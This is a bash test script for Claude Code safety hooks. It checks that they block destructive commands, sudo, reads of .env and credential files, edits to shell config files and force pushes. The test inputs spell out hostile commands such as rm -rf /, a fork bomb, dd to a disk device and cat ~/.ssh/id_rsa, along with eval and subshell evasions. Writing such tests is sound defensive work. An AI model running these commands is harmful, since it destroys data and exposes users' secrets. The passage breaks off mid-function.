#!/bin/bash
# Automated tests for Claude Code hooks
#
# Usage:
#   bash tests/test-hooks.sh           # Run all tests
#   bash tests/test-hooks.sh -q        # Quiet mode (summary + failures only)
#   bash tests/test-hooks.sh -v        # Verbose mode
#   bash tests/test-hooks.sh <hook>    # Test specific hook
#
# Exit codes:
#   0 - All tests passed
#   1 - Some tests failed

# Note: not using set -e because tests intentionally check failure cases
set -uo pipefail

HOOKS_DIR="${HOOKS_DIR:-.claude/hooks}"
export CLAUDE_HOOK_TEST=1

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/lib/test-helpers.sh"
parse_test_args "$@"
FILTER="${TEST_ARGS[0]:-}"

# Test helper: expects output to contain "block"
expect_block() {
    local hook="$1"
    local input="$2"
    local description="$3"

    TESTS_RUN=$((TESTS_RUN + 1))
    local output
    output=$(echo "$input" | "$HOOKS_DIR/$hook" 2>/dev/null) || true

    if echo "$output" | grep -q '"decision"[[:space:]]*:[[:space:]]*"block"'; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        report_pass "$description"
        log_verbose "    Output: $output"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        report_fail "$description"
        report_detail "Expected: block decision"
        report_detail "Got: ${output:-<empty>}"
    fi
}

# Test helper: expects output to be empty (allowed)
expect_allow() {
    local hook="$1"
    local input="$2"
    local description="$3"

    TESTS_RUN=$((TESTS_RUN + 1))
    local output
    output=$(echo "$input" | "$HOOKS_DIR/$hook" 2>/dev/null) || true

    # Allow means either empty output or explicit allow decision
    if [ -z "$output" ] || echo "$output" | grep -q '"decision"[[:space:]]*:[[:space:]]*"allow"'; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        report_pass "$description"
        log_verbose "    Output: ${output:-<empty>}"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        report_fail "$description"
        report_detail "Expected: empty or allow decision"
        report_detail "Got: $output"
    fi
}

# Test helper: expects PermissionRequest approval (decision.behavior: allow)
expect_approve() {
    local hook="$1"
    local input="$2"
    local description="$3"

    TESTS_RUN=$((TESTS_RUN + 1))
    local output
    output=$(echo "$input" | "$HOOKS_DIR/$hook" 2>/dev/null) || true

    if echo "$output" | grep -q '"behavior"[[:space:]]*:[[:space:]]*"allow"'; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        report_pass "$description"
        log_verbose "    Output: $output"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        report_fail "$description"
        report_detail "Expected: decision.behavior allow"
        report_detail "Got: ${output:-<empty>}"
    fi
}

# Test helper: expects empty output (hook stayed silent — no approval)
expect_silent() {
    local hook="$1"
    local input="$2"
    local description="$3"

    TESTS_RUN=$((TESTS_RUN + 1))
    local output
    output=$(echo "$input" | "$HOOKS_DIR/$hook" 2>/dev/null) || true

    if [ -z "$output" ]; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        report_pass "$description"
        log_verbose "    Output: <empty>"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        report_fail "$description"
        report_detail "Expected: <empty>"
        report_detail "Got: $output"
    fi
}

# Test helper: expects output to contain a string
expect_contains() {
    local hook="$1"
    local input="$2"
    local expected="$3"
    local description="$4"

    TESTS_RUN=$((TESTS_RUN + 1))
    local output
    output=$(echo "$input" | "$HOOKS_DIR/$hook" 2>/dev/null) || true

    if echo "$output" | grep -q "$expected"; then
        TESTS_PASSED=$((TESTS_PASSED + 1))
        report_pass "$description"
        log_verbose "    Output contains: $expected"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        report_fail "$description"
        report_detail "Expected to contain: $expected"
        report_detail "Got: ${output:-<empty>}"
    fi
}

# === BLOCK DANGEROUS COMMANDS ===
test_block_dangerous_commands() {
    report_section "=== block-dangerous-commands.sh ==="
    local hook="block-dangerous-commands.sh"

    # Should block
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}' \
        "blocks rm -rf /"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"rm -rf /*"}}' \
        "blocks rm -rf /*"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"rm -rf ~"}}' \
        "blocks rm -rf ~"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"rm -rf $HOME"}}' \
        "blocks rm -rf \$HOME"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"rm -rf ."}}' \
        "blocks rm -rf ."
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":":(){ :|:& };:"}}' \
        "blocks fork bomb"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"mkfs.ext4 /dev/sda"}}' \
        "blocks mkfs"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"dd if=/dev/zero of=/dev/sda"}}' \
        "blocks dd to disk"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"chmod -R 777 /"}}' \
        "blocks chmod -R 777 /"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"cat file > /dev/sda"}}' \
        "blocks redirect to disk device"

    # Should allow
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"rm -rf ./temp"}}' \
        "allows rm -rf ./temp (subdirectory)"
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' \
        "allows normal commands"
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"rm file.txt"}}' \
        "allows simple rm"

    # Command chaining — dangerous commands after chain operators
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo hello; rm -rf /"}}' \
        "blocks chained (;) rm -rf /"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo hello && rm -rf ~"}}' \
        "blocks chained (&&) rm -rf ~"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo hello || rm -rf ."}}' \
        "blocks chained (||) rm -rf ."
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo hello; mkfs.ext4 /dev/sda1"}}' \
        "blocks chained mkfs"

    # Chaining — should still allow safe chained commands
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"make clean && rm -rf ./build"}}' \
        "allows chained rm -rf on subdirectory"
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo hello; ls -la"}}' \
        "allows chained safe commands"

    # sudo commands
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"sudo apt-get install foo"}}' \
        "blocks sudo apt-get install"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"sudo rm -rf /tmp/stuff"}}' \
        "blocks sudo rm"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo hello && sudo cat /etc/shadow"}}' \
        "blocks chained sudo"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo hello; sudo ls"}}' \
        "blocks sudo after semicolon"

    # Evasion via subshell/eval/shell wrappers (uses jq for proper JSON escaping)
    expect_block "$hook" "$(jq -n --arg cmd '$(rm -rf /)' '{tool_name:"Bash",tool_input:{command:$cmd}}')" \
        "blocks subshell \$(rm -rf /)"
    expect_block "$hook" "$(jq -n --arg cmd '`rm -rf /`' '{tool_name:"Bash",tool_input:{command:$cmd}}')" \
        "blocks backtick rm -rf /"
    expect_block "$hook" "$(jq -n --arg cmd 'eval "rm -rf /"' '{tool_name:"Bash",tool_input:{command:$cmd}}')" \
        "blocks eval rm -rf /"
    expect_block "$hook" "$(jq -n --arg cmd 'bash -c "rm -rf /"' '{tool_name:"Bash",tool_input:{command:$cmd}}')" \
        "blocks bash -c rm -rf /"
    expect_block "$hook" "$(jq -n --arg cmd 'sh -c "rm -rf ~"' '{tool_name:"Bash",tool_input:{command:$cmd}}')" \
        "blocks sh -c rm -rf ~"
}

# === SECRETS GUARD ===
test_secrets_guard() {
    report_section "=== secrets-guard.sh ==="
    local hook="secrets-guard.sh"

    # Should block Read
    expect_block "$hook" '{"tool_name":"Read","tool_input":{"file_path":"/project/.env"}}' \
        "blocks reading .env"
    expect_block "$hook" '{"tool_name":"Read","tool_input":{"file_path":"/project/.env.local"}}' \
        "blocks reading .env.local"
    expect_block "$hook" '{"tool_name":"Read","tool_input":{"file_path":"/project/.env.production"}}' \
        "blocks reading .env.production"
    expect_block "$hook" '{"tool_name":"Read","tool_input":{"file_path":"/project/prod.env"}}' \
        "blocks reading prod.env (*.env pattern)"
    expect_block "$hook" '{"tool_name":"Read","tool_input":{"file_path":"/project/staging.env"}}' \
        "blocks reading staging.env (*.env pattern)"

    # Should block Bash - .env and .env.* variants
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"cat .env"}}' \
        "blocks cat .env"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"cat .env.local"}}' \
        "blocks cat .env.local"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"cat .env.production"}}' \
        "blocks cat .env.production"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"cat prod.env"}}' \
        "blocks cat prod.env (*.env pattern)"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"cat staging.env"}}' \
        "blocks cat staging.env (*.env pattern)"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"grep SECRET prod.env"}}' \
        "blocks grep prod.env (*.env pattern)"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"source .env"}}' \
        "blocks source .env"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"source .env.local"}}' \
        "blocks source .env.local"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"env | grep"}}' \
        "blocks env command"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"printenv"}}' \
        "blocks printenv"

    # Should allow Bash - .env.example/.env.template
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"cat .env.example"}}' \
        "allows cat .env.example"
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"source .env.template"}}' \
        "allows source .env.template"

    # Should block Read - credential files
    expect_block "$hook" "{\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"$HOME/.ssh/id_rsa\"}}" \
        "blocks reading SSH private key (id_rsa)"
    expect_block "$hook" "{\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"$HOME/.ssh/id_ed25519\"}}" \
        "blocks reading SSH private key (id_ed25519)"
    expect_block "$hook" "{\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"$HOME/.ssh/config\"}}" \
        "blocks reading SSH config"
    expect_block "$hook" "{\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"$HOME/.gnupg/private-keys-v1.d/key.key\"}}" \
        "blocks reading GPG private key (subpath)"
    expect_block "$hook" "{\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"$HOME/.gnupg\"}}" \
        "blocks reading GPG directory (no trailing slash)"
    expect_block "$hook" "{\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"$HOME/.aws/credentials\"}}" \
        "blocks reading AWS credentials"
    expect_block "$hook" "{\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"$HOME/.config/gh/hosts.yml\"}}" \
        "blocks reading GitHub CLI tokens"
    expect_block "$hook" "{\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"$HOME/.docker/config.json\"}}" \
        "blocks reading Docker config"
    expect_block "$hook" "{\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"$HOME/.kube/config\"}}" \
        "blocks reading kubeconfig"
    expect_block "$hook" "{\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"$HOME/.npmrc\"}}" \
        "blocks reading .npmrc"
    expect_block "$hook" "{\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"$HOME/.pypirc\"}}" \
        "blocks reading .pypirc"

    # Should block Bash - credential file reads
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"cat ~/.ssh/id_rsa"}}' \
        "blocks cat ~/.ssh/id_rsa"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"cat ~/.aws/credentials"}}' \
        "blocks cat ~/.aws/credentials"

    # Should allow
    expect_allow "$hook" '{"tool_name":"Read","tool_input":{"file_path":"/project/.env.example"}}' \
        "allows .env.example"
    expect_allow "$hook" '{"tool_name":"Read","tool_input":{"file_path":"/project/.env.template"}}' \
        "allows .env.template"
    expect_allow "$hook" '{"tool_name":"Read","tool_input":{"file_path":"/project/config.yaml"}}' \
        "allows non-.env files"
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"env VAR=value command"}}' \
        "allows env with assignment (not listing)"
    expect_allow "$hook" "{\"tool_name\":\"Read\",\"tool_input\":{\"file_path\":\"$HOME/.ssh/known_hosts\"}}" \
        "allows reading known_hosts"
    expect_allow "$hook" '{"tool_name":"Read","tool_input":{"file_path":"/project/ssh/config"}}' \
        "allows reading non-home ssh/config"

    # Should block Grep - .env files via path
    expect_block "$hook" '{"tool_name":"Grep","tool_input":{"pattern":"SECRET","path":"/project/.env"}}' \
        "blocks grep targeting .env"
    expect_block "$hook" '{"tool_name":"Grep","tool_input":{"pattern":"KEY","path":"/project/.env.local"}}' \
        "blocks grep targeting .env.local"
    expect_block "$hook" '{"tool_name":"Grep","tool_input":{"pattern":"KEY","path":"/project/.env.production"}}' \
        "blocks grep targeting .env.production"
    expect_block "$hook" '{"tool_name":"Grep","tool_input":{"pattern":"KEY","path":"/project/prod.env"}}' \
        "blocks grep targeting prod.env (*.env)"

    # Should block Grep - .env files via glob
    expect_block "$hook" '{"tool_name":"Grep","tool_input":{"pattern":"SECRET","glob":".env*"}}' \
        "blocks grep with .env* glob"
    expect_block "$hook" '{"tool_name":"Grep","tool_input":{"pattern":"SECRET","glob":".env.*"}}' \
        "blocks grep with .env.* glob"
    expect_block "$hook" '{"tool_name":"Grep","tool_input":{"pattern":"SECRET","glob":"*.env"}}' \
        "blocks grep with *.env glob"

    # Should block Grep - credential files
    expect_block "$hook" "{\"tool_name\":\"Grep\",\"tool_input\":{\"pattern\":\"key\",\"path\":\"$HOME/.gnupg\"}}" \
        "blocks grep targeting GPG directory (no trailing slash)"
    expect_block "$hook" "{\"tool_name\":\"Grep\",\"tool_input\":{\"pattern\":\"key\",\"path\":\"$HOME/.gnupg/trustdb.gpg\"}}" \
        "blocks grep targeting GPG subpath"
    expect_block "$hook" "{\"tool_name\":\"Grep\",\"tool_input\":{\"pattern\":\"key\",\"path\":\"$HOME/.aws/credentials\"}}" \
        "blocks grep targeting AWS credentials"
    expect_block "$hook" "{\"tool_name\":\"Grep\",\"tool_input\":{\"pattern\":\"key\",\"path\":\"$HOME/.ssh/id_rsa\"}}" \
        "blocks grep targeting SSH private key"
    expect_block "$hook" "{\"tool_name\":\"Grep\",\"tool_input\":{\"pattern\":\"key\",\"path\":\"$HOME/.ssh/config\"}}" \
        "blocks grep targeting SSH config"

    # Should allow Grep - safe targets
    expect_allow "$hook" '{"tool_name":"Grep","tool_input":{"pattern":"KEY","path":"/project/.env.example"}}' \
        "allows grep targeting .env.example"
    expect_allow "$hook" '{"tool_name":"Grep","tool_input":{"pattern":"KEY","path":"/project/.env.template"}}' \
        "allows grep targeting .env.template"
    expect_allow "$hook" '{"tool_name":"Grep","tool_input":{"pattern":"TODO","path":"/project/src"}}' \
        "allows grep targeting normal directory"
    expect_allow "$hook" '{"tool_name":"Grep","tool_input":{"pattern":"TODO","glob":"*.js"}}' \
        "allows grep with safe glob"
    expect_allow "$hook" "{\"tool_name\":\"Grep\",\"tool_input\":{\"pattern\":\"host\",\"path\":\"$HOME/.ssh/known_hosts\"}}" \
        "allows grep targeting known_hosts"
    expect_allow "$hook" "{\"tool_name\":\"Grep\",\"tool_input\":{\"pattern\":\"host\",\"path\":\"$HOME/.ssh/id_rsa.pub\"}}" \
        "allows grep targeting SSH public key"

    # Should block Bash - grep/rg/awk/sed reading .env files
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"grep SECRET .env"}}' \
        "blocks grep .env"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"grep -r password .env.local"}}' \
        "blocks grep .env.local"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"rg password .env"}}' \
        "blocks rg .env"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"awk -F= \"{print}\" .env"}}' \
        "blocks awk .env"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"sed -n \"s/KEY=//p\" .env"}}' \
        "blocks sed .env"

    # Should allow Bash - grep/rg with safe targets
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"grep TODO src/main.js"}}' \
        "allows grep on normal files"
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"grep KEY .env.example"}}' \
        "allows grep .env.example"
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"rg pattern src/"}}' \
        "allows rg on normal directory"

    # Should block Bash - grep/rg reading credential files
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"grep key ~/.aws/credentials"}}' \
        "blocks grep ~/.aws/credentials"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"rg token ~/.config/gh/hosts.yml"}}' \
        "blocks rg ~/.config/gh/hosts.yml"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"grep key ~/.ssh/id_rsa"}}' \
        "blocks grep ~/.ssh/id_rsa"
}

# === BLOCK CONFIG EDITS ===
test_block_config_edits() {
    report_section "=== block-config-edits.sh ==="
    local hook="block-config-edits.sh"

    # Should block Write
    expect_block "$hook" "{\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$HOME/.bashrc\",\"content\":\"test\"}}" \
        "blocks writing ~/.bashrc"
    expect_block "$hook" "{\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$HOME/.zshrc\",\"content\":\"test\"}}" \
        "blocks writing ~/.zshrc"
    expect_block "$hook" "{\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$HOME/.ssh/authorized_keys\",\"content\":\"test\"}}" \
        "blocks writing ~/.ssh/authorized_keys"
    expect_block "$hook" "{\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$HOME/.gitconfig\",\"content\":\"test\"}}" \
        "blocks writing ~/.gitconfig"

    # Should block Edit
    expect_block "$hook" "{\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$HOME/.bashrc\",\"old_string\":\"a\",\"new_string\":\"b\"}}" \
        "blocks editing ~/.bashrc"

    # Should block Bash write commands
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo \"export FOO=bar\" >> ~/.bashrc"}}' \
        "blocks appending to ~/.bashrc"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"tee -a ~/.zshrc"}}' \
        "blocks tee -a to ~/.zshrc"

    # Should allow
    expect_allow "$hook" '{"tool_name":"Write","tool_input":{"file_path":"/project/.bashrc","content":"test"}}' \
        "allows writing project-level .bashrc"
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}' \
        "allows normal bash commands"
}

# === ENFORCE UV RUN ===
test_enforce_uv_run() {
    report_section "=== enforce-uv-run.sh ==="
    local hook="enforce-uv-run.sh"

    # Should block - direct calls
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"python script.py"}}' \
        "blocks direct python"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"python3 script.py"}}' \
        "blocks direct python3"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"python3.11 script.py"}}' \
        "blocks direct python3.11"

    # Should block - chained/compound commands
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"cd /app && python script.py"}}' \
        "blocks chained (&&) python"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"cd /app; python script.py"}}' \
        "blocks chained (;) python"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"cd /app || python script.py"}}' \
        "blocks chained (||) python"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"VAR=1 python script.py"}}' \
        "blocks env-prefixed python"

    # Should allow
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"uv run python script.py"}}' \
        "allows uv run python"
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"uv run pytest"}}' \
        "allows uv run pytest"
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' \
        "allows non-python commands"
}

# === ENFORCE MAKE COMMANDS ===
test_enforce_make_commands() {
    report_section "=== enforce-make-commands.sh ==="
    local hook="enforce-make-commands.sh"

    # Should block (bare commands = full suite runs)
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"pytest"}}' \
        "blocks bare pytest"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"uv run pytest"}}' \
        "blocks uv run pytest"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"pre-commit run"}}' \
        "blocks direct pre-commit"
    expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"ruff check ."}}' \
        "blocks direct ruff"

    # Should allow
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"make test"}}' \
        "allows make test"
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"make lint"}}' \
        "allows make lint"
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"pytest tests/"}}' \
        "allows targeted pytest"
    expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' \
        "allows other commands"
}

# === SUGGEST JSON READER ===
test_suggest_json_reader() {
    report_section "=== suggest-read-json.sh ==="
    local hook="suggest-read-json.sh"

    # Should block (large JSON or unknown JSON)
    expect_block "$hook" '{"tool_name":"Read","tool_input":{"file_path":"/project/data.json"}}' \
        "blocks unknown .json files"
    expect_block "$hook" '{"tool_name":"Read","tool_input":{"file_path":"/project/output.json"}}' \
        "blocks data .json files"

    # Should allow (config files in allowlist)
    expect_allow "$hook" '{"tool_name":"Read","tool_input":{"file_path":"/project/package.json"}}' \
        "allows package.json"
    expect_allow "$hook" '{"tool_name":"Read","tool_input":{"file_path":"/project/tsconfig.json"}}' \
        "allows tsconfig.json"
    expect_allow "$hook" '{"tool_name":"Read","tool_input":{"file_path":"/project/config.yaml"}}' \
        "allows non-json files"
}

# === GIT SAFETY ===
test_git_safety() {
    report_section "=== git-safety.sh ==="
    local hook="git-safety.sh"

    # Create temp git repo for testing
    local temp_dir
    temp_dir=$(mktemp -d)
    local counters_file
    counters_file=$(mktemp)

    # Run in subshell (needed for cd into temp git repo)
    # Write counters to temp file so parent can read them back
    (
        cd "$temp_dir"
        HOOKS_DIR="$OLDPWD/$HOOKS_DIR"
        git init -q
        git config user.email "test@test.com"
        git config user.name "Test"
        echo "test" > file.txt
        git add file.txt
        git commit -q -m "initial"

        # Test on main branch
        git checkout -q -b main 2>/dev/null || git checkout -q main

        # --- Protected branch enforcement ---

        # Should block EnterPlanMode on main
        expect_block "$hook" '{"tool_name":"EnterPlanMode"}' \
            "blocks EnterPlanMode on main"

        # Should block git commit on main
        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git commit -m \"test\""}}' \
            "blocks git commit on main"

        # Switch to feature branch
        git checkout -q -b feature/test

        # Should allow on feature branch
        expect_allow "$hook" '{"tool_name":"EnterPlanMode"}' \
            "allows EnterPlanMode on feature branch"

        expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"git commit -m \"test\""}}' \
            "allows git commit on feature branch"

        # --- Severe: force push to protected branch (block + severity verification) ---

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push --force origin main"}}' \
            "blocks force push to main (--force)"
        expect_contains "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push --force origin main"}}' \
            "not reversible" "severe: force push to protected (--force)"

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push -f origin main"}}' \
            "blocks force push to main (-f)"
        expect_contains "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push -f origin main"}}' \
            "not reversible" "severe: force push to protected (-f)"

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push origin main --force"}}' \
            "blocks force push to main (trailing --force)"
        expect_contains "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push origin main --force"}}' \
            "not reversible" "severe: force push to protected (trailing)"

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push --force-with-lease origin main"}}' \
            "blocks force-with-lease to main"
        expect_contains "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push --force-with-lease origin main"}}' \
            "not reversible" "severe: force-with-lease to protected"

        # --- Severe: git push --mirror (block + severity verification) ---

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push --mirror"}}' \
            "blocks git push --mirror"
        expect_contains "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push --mirror"}}' \
            "not reversible" "severe: mirror push"

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push --mirror origin"}}' \
            "blocks git push --mirror with remote"
        expect_contains "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push --mirror origin"}}' \
            "not reversible" "severe: mirror push with remote"

        # --- Severe: delete protected branch on remote (block + severity verification) ---

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push --delete origin main"}}' \
            "blocks delete main (--delete)"
        expect_contains "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push --delete origin main"}}' \
            "not reversible" "severe: delete protected (--delete main)"

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push origin :main"}}' \
            "blocks delete main (colon syntax)"
        expect_contains "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push origin :main"}}' \
            "not reversible" "severe: delete protected (colon main)"

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push --delete origin master"}}' \
            "blocks delete master (--delete)"
        expect_contains "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push --delete origin master"}}' \
            "not reversible" "severe: delete protected (--delete master)"

        # --- Soft: force push to non-protected branch (block + severity verification) ---

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push -f origin feature-branch"}}' \
            "blocks force push to non-protected branch"
        expect_contains "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push -f origin feature-branch"}}' \
            "rewrites remote history" "soft: force push non-protected"

        # --- Soft: delete any remote branch (block + severity verification) ---

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push --delete origin feature-branch"}}' \
            "blocks delete non-protected remote branch (--delete)"
        expect_contains "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push --delete origin feature-branch"}}' \
            "removes it for all" "soft: delete non-protected (--delete)"

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push origin :feature-branch"}}' \
            "blocks delete non-protected remote branch (colon)"
        expect_contains "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push origin :feature-branch"}}' \
            "removes it for all" "soft: delete non-protected (colon)"

        # --- Soft: cross-branch push (block + severity verification) ---

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push origin HEAD:other-branch"}}' \
            "blocks cross-branch push"
        expect_contains "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push origin HEAD:other-branch"}}' \
            "accidentally overwrite" "soft: cross-branch push"

        # --- Allow: safe operations ---

        expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push"}}' \
            "allows simple push"

        expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}' \
            "allows non-force push to main"

        expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push -u origin feature"}}' \
            "allows push -u (not -f)"

        expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push origin feature/test"}}' \
            "allows normal push to feature branch"

        expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"git push origin feature/test:feature/test"}}' \
            "allows refspec push to same branch"

        # --- Passthrough: non-git commands and other tools ---

        expect_allow "$hook" '{"tool_name":"Read","tool_input":{"file_path":"test.txt"}}' \
            "allows non-Bash/non-EnterPlanMode tools"

        expect_allow "$hook" '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' \
            "allows non-git bash commands"

        # --- Detached HEAD state ---

        git checkout --detach HEAD 2>/dev/null

        expect_block "$hook" '{"tool_name":"EnterPlanMode"}' \
            "blocks EnterPlanMode in detached HEAD"
        expect_contains "$hook" '{"tool_name":"EnterPlanMode"}' \
            "detached HEAD" "detached HEAD: EnterPlanMode"

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git commit -m \"test\""}}' \
            "blocks git commit in detached HEAD"
        expect_contains "$hook" '{"tool_name":"Bash","tool_input":{"command":"git commit -m \"test\""}}' \
            "detached HEAD" "detached HEAD: git commit"

        # --- Master branch protection ---

        git checkout -q -b master 2>/dev/null

        expect_block "$hook" '{"tool_name":"EnterPlanMode"}' \
            "blocks EnterPlanMode on master"

        expect_block "$hook" '{"tool_name":"Bash","tool_input":{"command":"git commit -m \"test\""}}' \
            "blocks git commit on master"

        # Export counters for parent shell
        echo "$TESTS_RUN $TESTS_PASSED $TESTS_FAILED" > "$counters_file"
    )

    # Read counters back from subshell
    read -r sub_run sub_passed sub_failed < "$counters_file"
    TESTS_RUN=$((TESTS_RUN + sub_run))
    TESTS_PASSED=$((TESTS_PASSED + sub_passed))
    TESTS_FAILED=$((TESTS_FAILED + sub_failed))

    # Cleanup
    rm -rf "$temp_dir" "$counters_file"

    # --- Non-git directory tests (separate subshell) ---
    local nogit_dir
    nogit_dir=$(mktemp -d)
    local nogit_counters
    nogit_counters=$(mktemp)

    (
        cd "$nogit_dir"
        HOOKS_DIR="$OLDPWD/$HOOKS_DIR"

